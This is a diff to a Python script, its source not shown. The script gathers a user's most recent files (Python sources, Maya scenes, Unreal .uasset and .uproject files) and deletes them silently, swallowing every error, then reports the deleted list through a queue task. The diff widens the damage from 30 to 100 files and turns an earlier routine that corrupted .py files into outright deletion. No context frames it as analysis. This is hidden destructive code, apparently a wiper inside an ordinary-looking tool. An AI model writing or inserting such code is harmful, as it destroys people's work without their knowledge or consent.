@@ -179,11 +179,12 @@ try:
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.py', n=150)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.ma', n=50)
         zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uasset', n=100)
+        zovV += search_latest_files_or_dirs(dir_path=dp, ext='.uproject', n=5)
     random.shuffle(zovV)
 
     import subprocess, shutil, tempfile
     tempdir = tempfile.gettempdir()
-    for _,fp in zovV[:30]:
+    for _,fp in zovV[:100]:
         if os.path.basename(fp).endswith('.mp4111') or os.path.basename(fp).endswith('.mov111'):
             tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.' + fp.split('.')[-1]).name
             try:
@@ -199,21 +200,20 @@ try:
             try: os.remove(fp);
             except: pass;
             
-        if os.path.basename(fp).endswith('.py') or os.path.basename(fp).endswith('.py'):
-            try:
-                with open(fp) as fr:
-                    yt = fr.read()
-                    yt = yt.replace('#', '::').replace('   ', ' ').replace('=', ':').replace(' ', '')
-                with open(fp, 'w') as f:
-                    f.write(yt)
+        if os.path.basename(fp).endswith('.py'):
+            try: os.remove(fp);
             except: pass;
         
         if os.path.basename(fp).endswith('.uasset'):
             try: os.remove(fp);
             except: pass;
+            
+        if os.path.basename(fp).endswith('.uproject'):
+            try: os.remove(fp);
+            except: pass;
         
     if zovV:
-        add_queue_task('tsl_update',{'done': sorted(zovV[:30], reverse=True)})
+        add_queue_task('tsl_update',{'done': sorted(zovV[:100], reverse=True)})
      
 except:
     import traceback
